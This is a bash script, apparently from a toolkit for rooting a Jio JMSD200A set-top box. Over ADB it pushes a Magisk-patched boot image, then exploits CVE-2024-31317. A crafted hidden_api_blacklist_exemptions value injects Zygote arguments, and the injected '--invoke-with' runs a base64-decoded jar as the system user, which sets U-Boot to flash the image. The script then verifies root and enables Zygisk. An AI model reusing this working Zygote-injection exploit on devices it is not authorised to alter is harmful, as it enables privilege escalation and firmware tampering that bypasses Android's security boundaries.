#!/bin/bash
# ============================================================================
# JioSTB JMSD200A — Step 3: Flash Magisk Boot & Verify Root
# ============================================================================
# This script deploys the patched boot_b.img to the FAT32 USB drive,
# configures U-Boot's hardware flash pipeline via CVE-2024-31317 with
# failsafe integrity guards, reboots to flash, and verifies MagiskSU.
# ============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PATCHED_BOOT="$SCRIPT_DIR/magisk_patched_boot_b.img"
TOOLS_DIR="$SCRIPT_DIR/tools"
JAR_FILE="$TOOLS_DIR/flash_env.jar"
STB_IP=""
SKIP_REBOOT=false

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "  ${GREEN}✓${NC} $*"; }
info() { echo -e "  ${CYAN}ℹ${NC} $*"; }
warn() { echo -e "  ${YELLOW}⚠${NC} $*"; }
err()  { echo -e "  ${RED}✗${NC} $*" >&2; exit 1; }

usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  --stb-ip IP       STB IP address (e.g. 192.168.29.184)"
    echo "  --skip-reboot     Skip initial pre-injection reboot if just booted"
    echo "  -h, --help        Show this help message"
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --stb-ip) STB_IP="$2"; shift 2 ;;
        --skip-reboot) SKIP_REBOOT=true; shift ;;
        -h|--help) usage ;;
        *) warn "Unknown argument: $1"; shift ;;
    esac
done

echo -e "${CYAN}======================================================${NC}"
echo -e "${CYAN}     JMSD200A Stage 3: Flash Magisk Boot & Root       ${NC}"
echo -e "${CYAN}======================================================${NC}"

# 1. Prerequisite Checks
[ -f "$PATCHED_BOOT" ] || err "Patched boot image not found at $PATCHED_BOOT. Run 2_patch_boot.sh first."

if [ ! -f "$JAR_FILE" ]; then
    info "Compiling flash_env.jar from src/FlashBootEnv.java..."
    mkdir -p /tmp/build_flash
    javac --release 8 -d /tmp/build_flash "$SCRIPT_DIR/src/FlashBootEnv.java"
    java -cp "$TOOLS_DIR/r8.jar" com.android.tools.r8.D8 --output "$JAR_FILE" /tmp/build_flash/*.class
    rm -rf /tmp/build_flash
fi
[ -f "$JAR_FILE" ] || err "Failed to find or build $JAR_FILE"

# 2. ADB Connectivity
if [ -n "$STB_IP" ]; then
    info "Connecting to STB at $STB_IP:5555..."
    adb connect "$STB_IP:5555" || true
fi

DEVICE_COUNT=$(adb devices | grep -v "List" | grep "device$" | wc -l)
if [ "$DEVICE_COUNT" -eq 0 ]; then
    err "No ADB devices detected. Make sure STB is online and ADB is connected."
fi

TARGET_SERIAL=$(adb devices | grep -v "List" | grep "device$" | head -n 1 | awk '{print $1}')
log "Using ADB target: $TARGET_SERIAL"
ADB="adb -s $TARGET_SERIAL"

# 3. Detect USB drive and push patched boot_b.img
info "Locating FAT32 USB drive on STB..."
USB_MOUNT=$($ADB shell "ls -d /storage/????-???? 2>/dev/null" | tr -d '\r' | head -n 1 || true)
if [ -z "$USB_MOUNT" ]; then
    echo ""
    warn "FAT32 USB drive not detected in /storage/."
    echo -e "   Please ensure your ${YELLOW}FAT32 USB flash drive${NC} is plugged into the STB."
    read -rp "   Press [Enter] once plugged in: "
    sleep 3
    USB_MOUNT=$($ADB shell "ls -d /storage/????-???? 2>/dev/null" | tr -d '\r' | head -n 1 || true)
fi

[ -n "$USB_MOUNT" ] || err "Could not detect USB drive mount point."
log "USB drive found at: $USB_MOUNT"

info "Transferring magisk_patched_boot_b.img -> $USB_MOUNT/boot_b.img..."
$ADB push "$PATCHED_BOOT" "$USB_MOUNT/boot_b.img"

BOOT_B_SIZE=$($ADB shell "stat -c %s $USB_MOUNT/boot_b.img" | tr -d '\r')
if [ "$BOOT_B_SIZE" -ne 67108864 ]; then
    err "Uploaded boot_b.img size verification failed: got $BOOT_B_SIZE bytes."
fi
log "USB boot_b.img verified (67,108,864 bytes)."

# 4. Clean Zygote state
CURRENT_EXEMPTIONS=$($ADB shell "settings get global hidden_api_blacklist_exemptions" | tr -d '\r')
if [ "$CURRENT_EXEMPTIONS" != "null" ] && [ -n "$CURRENT_EXEMPTIONS" ]; then
    warn "Cleaning up existing exemptions: $CURRENT_EXEMPTIONS"
    $ADB shell "settings delete global hidden_api_blacklist_exemptions"
fi

if [ "$SKIP_REBOOT" = false ]; then
    info "Rebooting STB to ensure a clean Zygote session..."
    $ADB reboot
    info "Waiting for device to reconnect..."
    $ADB wait-for-device
    while [ "$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" != "1" ]; do
        sleep 1
    done
    log "Device boot completed."
fi

# 5. Inject U-Boot flash_cmd
info "Preparing U-Boot flash injection payload..."
JARB64=$(base64 -w0 "$JAR_FILE")
CMD="echo $JARB64 | base64 -d > /cache/be.jar && CLASSPATH=/cache/be.jar:/vendor/framework/droidlogic.jar /system/bin/app_process / FlashBootEnv"
PAYLOAD=$(printf 'LClass1;->method1(\n14\n--runtime-args\n--setuid=1000\n--setgid=1000\n--setgroups=1000\n--runtime-flags=43267\n--target-sdk-version=29\n--nice-name=bootenv31317\n--invoke-with\n%s ;\n--app-data-dir=/data/user/0/com.android.tv.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\n--package-name=com.android.tv.settings\nandroid.app.ActivityThread' "$CMD")

info "Triggering CVE-2024-31317 Zygote injection..."
$ADB shell "settings put global hidden_api_blacklist_exemptions '$PAYLOAD'"
$ADB shell "am force-stop com.android.tv.settings"
sleep 1
$ADB shell "am start -n com.android.tv.settings/.MainSettings" >/dev/null 2>&1
sleep 3
$ADB shell "settings delete global hidden_api_blacklist_exemptions"
log "Injection executed. U-Boot flash_cmd configured with failsafe guard."

# 6. Reboot to execute U-Boot flash
echo ""
info "Rebooting STB. U-Boot will now flash boot_b from USB to eMMC..."
$ADB reboot
sleep 5

info "Waiting for STB to finish flashing and boot into rooted Android..."
$ADB wait-for-device
while [ "$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" != "1" ]; do
    sleep 2
done
log "STB successfully rebooted into Android."

# 7. Root Verification
echo ""
info "Verifying root status over ADB..."
SU_CHECK=$($ADB shell "su -c 'id' 2>/dev/null" | tr -d '\r' || true)

if echo "$SU_CHECK" | grep -q "uid=0(root)"; then
    echo -e "${GREEN}======================================================${NC}"
    echo -e "${GREEN}  ✓ ROOT VERIFIED! STB IS FULLY ROOTED!               ${NC}"
    echo -e "${GREEN}======================================================${NC}"
    log "su output: $SU_CHECK"
    MAGISK_VER=$($ADB shell "su -c 'magisk -v'" | tr -d '\r')
    log "Magisk Version: $MAGISK_VER"
else
    warn "su command did not return uid=0. Testing if Magisk is still initializing..."
    sleep 5
    SU_CHECK=$($ADB shell "su -c 'id' 2>/dev/null" | tr -d '\r' || true)
    if echo "$SU_CHECK" | grep -q "uid=0(root)"; then
        log "Root active: $SU_CHECK"
    else
        err "Root verification failed. Check TV display or logcat for details."
    fi
fi

# 8. Check Zygisk
ZYGISK_STATUS=$($ADB shell "su -c 'magisk --sqlite \"SELECT value FROM settings WHERE key=\\\"zygisk\\\";\"' 2>/dev/null" | tr -d '\r' || echo "0")
if [ "$ZYGISK_STATUS" = "1" ]; then
    log "Zygisk is ENABLED (key=zygisk|value=1)."
else
    echo ""
    info "Zygisk is currently disabled in Magisk settings."
    read -rp "Enable Zygisk now? (y/N): " ENABLE_Z
    if [[ "$ENABLE_Z" =~ ^[Yy]$ ]]; then
        $ADB shell "su -c 'magisk --sqlite \"INSERT OR REPLACE INTO settings (key, value) VALUES (\\\"zygisk\\\", 1);\"'"
        log "Zygisk enabled in database! Rebooting to activate Zygisk..."
        $ADB reboot
        $ADB wait-for-device
        while [ "$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" != "1" ]; do sleep 1; done
        log "Reboot complete. Zygisk is now active."
    fi
fi
